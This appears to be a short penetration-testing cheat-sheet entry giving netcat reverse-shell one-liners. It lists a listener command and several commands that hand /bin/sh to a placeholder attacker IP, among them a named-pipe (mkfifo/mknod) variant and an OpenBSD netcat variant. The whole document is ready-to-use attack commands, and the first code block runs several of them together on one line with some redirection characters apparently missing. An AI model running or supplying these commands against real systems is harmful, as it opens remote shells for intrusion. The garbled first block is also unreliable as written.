Netcat Reverse Shell Useful netcat reverse shell examples: Don't forget to start your listener, or you won't be catching any shells :)
```
nc -lnvp 80 nc -e /bin/sh ATTACKING-IP 80 /bin/sh | nc ATTACKING-IP 80 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

A reverse shell submitted by @0xatul which works well for OpenBSD netcat rather than GNU nc: 
```
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```